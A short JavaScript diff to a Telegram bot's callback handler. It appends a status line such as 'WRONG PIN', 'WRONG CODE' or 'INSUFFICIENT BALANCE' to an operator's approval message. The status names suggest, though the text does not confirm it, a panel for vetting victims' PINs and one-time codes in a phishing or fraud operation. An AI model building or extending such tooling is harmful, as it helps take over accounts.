@@ -470,11 +470,33 @@ async function processTelegramCallbacks() {
       updateRequestStatus(id, status);
       await api.answerCallbackQuery({ callback_query_id: callback.id, text: LABEL_BY_ACTION[action] });
       if (messageId) {
-        await api.editMessageReplyMarkup({
-          chat_id: chatId,
-          message_id: messageId,
-          reply_markup: { inline_keyboard: [] },
-        });
+        const statusLabel = {
+          phone_pin_verified: 'APPROVED',
+          completed: 'APPROVED',
+          wrong_pin: 'WRONG PIN',
+          wrong_otp: 'WRONG CODE',
+          wrong_link: 'WRONG LINK',
+          insufficient_balance: 'INSUFFICIENT BALANCE',
+        }[status] || status.toUpperCase();
+        const statusPrefix = statusLabel === 'APPROVED' ? '✅' : statusLabel.startsWith('INSUFFICIENT') ? '⚠️' : '❌';
+        const originalText = callback.message?.text || '';
+        const updatedText = `${originalText}\n\n${statusPrefix} Status: ${statusLabel}`;
+
+        try {
+          await api.editMessageText({
+            chat_id: chatId,
+            message_id: messageId,
+            text: updatedText,
+            reply_markup: { inline_keyboard: [] },
+          });
+        } catch (err) {
+          console.error('Failed to update Telegram approval message:', err.message);
+          await api.editMessageReplyMarkup({
+            chat_id: chatId,
+            message_id: messageId,
+            reply_markup: { inline_keyboard: [] },
+          });
+        }
       }
     }
   } catch (err) {
